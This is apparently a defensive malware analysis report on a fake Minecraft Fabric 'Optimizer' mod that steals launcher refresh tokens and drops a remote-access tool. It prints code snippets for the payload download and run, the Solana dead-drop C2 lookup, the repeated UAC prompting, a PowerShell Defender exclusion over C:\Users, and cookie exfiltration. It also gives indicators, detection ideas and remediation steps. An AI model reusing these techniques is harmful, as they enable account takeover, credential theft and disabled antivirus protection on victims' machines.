# Case 026 — "Optimizer" / Weedhack: Fabric mod → Solana dead-drop C2 → Defender exclusion → RAT

- **Verdict:** **confirmed malicious** — Minecraft Fabric stealer/RAT dropper
- **Category:** Minecraft-targeting infostealer + remote collection component (Weedhack panel)
- **Handling:** OSINT — **source read, never executed.** No binary obtained.
- **Date:** 2026-11-19
- **Analyst:** OpenHands (open-source intelligence)
- **Primary source:** `d3xondev/optimizer-malware-analysis`
  (https://github.com/d3xondev/optimizer-malware-analysis), report dated 2026-11-15
- **Evidence:** `evidence/source-readme.md`

---

## 1. Summary

`optimizer_1794778622855.jar` (4,565 bytes) is a Fabric mod that claims performance improvements and
contains **no game code at all**. Its only behaviour is to steal Minecraft launcher accounts, fetch a
private Java runtime and a second stage over **plain HTTP**, run that stage, add a **Windows Defender
exclusion covering `C:\Users`**, and upload the collected data to a panel at `weedhack.lol`.

| Item | Value |
|---|---|
| Stage 0 | `optimizer_1794778622855.jar`, **4,565 bytes** |
| Stage 1 | `st.jar`, **1,888,639 bytes** |
| C2 (direct) | `31.59.106.34` (AS56971, Riga, LV) |
| Panel | `weedhack.lol`, API `remote.weedhack.lol` |

## 2. The mod is a stub — and that is provable from its manifest

```json
{
  "id": "optimizer",
  "name": "Optimizer",
  "description": "Performance improvements.",
  "authors": ["System"],
  "entrypoints": { "preLaunch": ["com.optimizer.OptimizerMod::init"] }
}
```

Three decisive facts:

1. **`preLaunch`** runs *before* the game window exists — the payload executes even if the user never
   reaches the main menu.
2. **No mixins, no rendering code** in the archive. A performance mod with no game hooks cannot
   improve performance; the description is a lie by construction.
3. **Author `System`**, empty contact block.

This "no-code mod" test is a **general detector**: a Fabric mod whose only entrypoint is `preLaunch`
and which registers no mixins is not a mod.

## 3. Stage 0 behaviour

`init()` spawns a thread and performs, in order:

### 3a. Credential collection *before* any network activity

```java
File mc      = new File(System.getenv("APPDATA"), ".minecraft");
File lunar   = new File(appData, ".lunarclient\\settings\\game\\accounts.json");
File feather = new File(appData, ".feather\\accounts.json");
```

Concatenated into `%LOCALAPPDATA%\Microsoft\AppBroker\output\ssid.txt`:

| File | Contents |
|---|---|
| `%APPDATA%\.minecraft\launcher_accounts.json` | access **and refresh** tokens |
| `%APPDATA%\.minecraft\launcher_profiles.json` | profiles, legacy auth |
| `%APPDATA%\.lunarclient\settings\game\accounts.json` | Lunar accounts |
| `%APPDATA%\.feather\accounts.json` | Feather accounts |

**Why refresh tokens matter:** they allow account takeover **without** the password and **without**
2FA, and a password change does not necessarily revoke an already-issued refresh token. This is the
single most damaging capability in the whole Minecraft-stealer class.

### 3b. Staging directory that impersonates Microsoft

`%LOCALAPPDATA%\Microsoft\AppBroker\` — **not** a real Microsoft component. It sits next to
`Microsoft\Edge` and `Microsoft\OneDrive` so it looks plausible in a directory listing. This is
**living-off-the-land naming**, not a random temp path.

### 3c. Payload retrieval — plain HTTP, no verification

```java
download("http://" + HOST + "/api/downloads/jre.zip", jreZip);
unzip(jreZip, jreDir); jreZip.delete();
download("http://" + HOST + "/api/downloads/st.jar", stJar);
new ProcessBuilder(javaw, "-jar", stJar, KEY, HOST)
    .redirectOutput(DISCARD).redirectError(DISCARD).start();
```

No TLS, **no signature check, no hash check** — any on-path attacker can substitute the payload.
`javaw.exe` (not `java.exe`) is chosen to avoid a console window.

## 4. Stage 1 (`st.jar`) — Solana dead-drop C2

```java
SOLANA_WALLET = "BCy1eKppGB5WPmQ8PrSJT4gkMRy5HmzsuaVrnqef7zoV";
SOLANA_RPC    = "https://api.devnet.solana.com";
```

It calls `getSignaturesForAddress` (limit 10), then `getTransaction` for each signature, and parses
the **transaction memo**: find the literal `1(`, take up to `)`, require an IPv4 match.

Observed memos at analysis time:

| Memo | Timestamp (UTC) |
|---|---|
| `[15] 1(31.59.106.34)` | 2026-11-11 21:04 |
| `[17] 1(104.253.43.109)` | 2026-11-11 14:23 |
| `[17] 3(95.182.116.120)` | 2026-11-03 19:29 |
| `[15] 2(31.59.175.15)` | 2026-10-31 15:32 |
| `[16] 1(95.182.96.216)` | 2026-10-31 01:35 |

The parser **requires `1(`**, so entries tagged `2`/`3` are silently skipped — a build/attempt
counter that also acts as a crude "only use the newest live address" mechanism. **Devnet** is used
because transactions are effectively free. The payload talks only to the public RPC, never to the
wallet itself, so the wallet is never linked on-chain to the victims.

**This is the third blockchain in this database**: Ethereum (016), **Polygon** (024), **Solana** (026).

## 5. Elevation — consent-prompt looping, not a bypass

```java
return new File("C:\\Windows\\System32\\config").list() != null;   // "am I admin?"
```

If not elevated, it relaunches **once per second, unbounded**:

```powershell
Start-Process -FilePath '<jre>\bin\javaw.exe' -Verb RunAs `
  -ArgumentList '-jar "<st.jar>" <KEY> <HOST>' -WindowStyle Hidden
```

No UAC bypass — it simply **asks again and again** until the user clicks Yes. That is enough because
the prompt appears right after the user installed a "mod", when granting admin feels normal. A
`.lock` file coordinates parent/child; the elevated child deletes it and the parent exits.

Contrast with **case 025 (Exastealer)**, which uses a real `ICMLuaUtil` bypass. Both strategies are in
active use.

## 6. Defence evasion — a Defender exclusion over all user profiles

```powershell
Add-MpPreference -ExclusionPath 'C:\Users', '<AppBroker>' -ErrorAction Stop
```

If that fails, it compiles inline C# with `Add-Type` and calls the WMI provider
`MSFT_MpPreference.Add` with the same paths. A ten-second sleep lets policy apply before the next
download.

**Excluding `C:\Users` removes Defender coverage from every user profile on the host.** There is no
benign reason for a mod to do this — it is conclusive.

Both attempts and the captured PowerShell output are written to `error.log` in the staging dir,
recording the exclusion result, the registration response, the assigned `clientId`, and every upload
attempt. **Preserve `error.log` during incident response** — it is the best evidence on the host.

## 7. Registration and second stage

```json
{"cmd":"ping_ip","key":"<KEY>","hostname":"<COMPUTERNAME>","ip":"<public IP>"}
```

POST to `http://<C2>/api/rpc`; the public IP comes from `https://api.ipify.org`. The response is
parsed for `"clientId":` and saved to `client_id.txt` — a persistent per-host identifier for the
operator's panel.

Then two Windows components run from the staging dir:

```java
new ProcessBuilder("cmd.exe","/c","AppCaller.exe all").directory(dir).start();
Thread.sleep(30_000);
new ProcessBuilder("cmd.exe","/c","dllhost.exe " + key).directory(dir).start();
```

- `AppCaller.exe` + `caller.dll` — the **collection component**; `all` = every supported source.
  Output lands in `output\` and `cookies\`.
- `dllhost.exe` — **masquerades as a Windows system process** and is passed the licence key, so it
  authenticates to the panel independently.

Both launches require the file to exceed 1 KB (a minimal "did the server return a file or an error
page" check).

## 8. Exfiltration

`output\` and `cookies\` are zipped to `capture.zip` and submitted **base64 inside JSON**:

```json
{"cmd":"upload","key":"...","clientId":0,"hostname":"...","realIp":"...",
 "name":"capture.zip","data":"<base64>"}
```

Base64-in-JSON over HTTP is chosen to look like ordinary API traffic and to survive naive content
inspection.

## 9. Indicators

```
ip        31.59.106.34        C2 (AS56971, Riga, LV)
ip        104.253.43.109      Solana memo (unused)
ip        95.182.116.120      Solana memo (unused)
ip        31.59.175.15        Solana memo (unused)
ip        95.182.96.216       Solana memo (unused)
domain    weedhack.lol        panel
domain    remote.weedhack.lol API
domain    api.devnet.solana.com  dead-drop RPC
domain    api.ipify.org       public IP lookup
string    BCy1eKppGB5WPmQ8PrSJT4gkMRy5HmzsuaVrnqef7zoV   Solana wallet
url       http://31.59.106.34/api/downloads/jre.zip
url       http://31.59.106.34/api/downloads/st.jar
url       http://31.59.106.34/api/rpc
file      %LOCALAPPDATA%\Microsoft\AppBroker\          staging dir (fake MS)
file      %LOCALAPPDATA%\Microsoft\AppBroker\output\ssid.txt
file      %LOCALAPPDATA%\Microsoft\AppBroker\error.log
file      %LOCALAPPDATA%\Microsoft\AppBroker\client_id.txt
file      %LOCALAPPDATA%\Microsoft\AppBroker\capture.zip
process   AppCaller.exe all
process   dllhost.exe <key>       (fake dllhost in %LOCALAPPDATA%)
powershell Add-MpPreference -ExclusionPath 'C:\Users'
```

## 10. Detection ideas

- **Fabric mod with only a `preLaunch` entrypoint and zero mixins** → not a mod.
- `Add-MpPreference -ExclusionPath 'C:\Users'` — should never occur; alert unconditionally.
- A `dllhost.exe` **not** in `System32` — Windows' real `dllhost.exe` lives in `System32`.
- Any process writing `%LOCALAPPDATA%\Microsoft\AppBroker\`.
- Unbounded `Start-Process -Verb RunAs` loops (repeated UAC prompts, one per second).
- Outbound to `api.devnet.solana.com` from a Java process on a gaming PC.

## 11. MITRE ATT&CK

`T1204.002`, `T1036.005` (masquerading), `T1036.005`+`T1036.008` (fake `dllhost.exe`,
`Microsoft\AppBroker`), `T1102.001` (dead-drop resolver), `T1071.001`, `T1105`, `T1059.001`
(PowerShell), `T1562.001` (impair defenses — Defender exclusion), `T1548.002` (elevation via consent),
`T1528`, `T1555.003`, `T1005`, `T1041`, `T1027`.

## 12. Remediation

1. Remove the Defender exclusion for `C:\Users` **first** — otherwise everything else stays invisible.
2. Delete `%LOCALAPPDATA%\Microsoft\AppBroker\` but **preserve `error.log`** first.
3. Invalidate Minecraft sessions; **revoke refresh tokens** by changing the Microsoft password and
   removing connected apps (a password change alone may not revoke them).
4. Rotate all browser credentials; the collection component took `cookies\`.
5. Hunt for `dllhost.exe` outside `System32`.

## 13. Caveats

- Third-party analysis; not independently re-verified. No binary handled.
- The exact capability of `AppCaller.exe`/`caller.dll` is inferred from its invocation and output
  directories, not from source.
- Solana memos are mutable; the addresses above are historical.
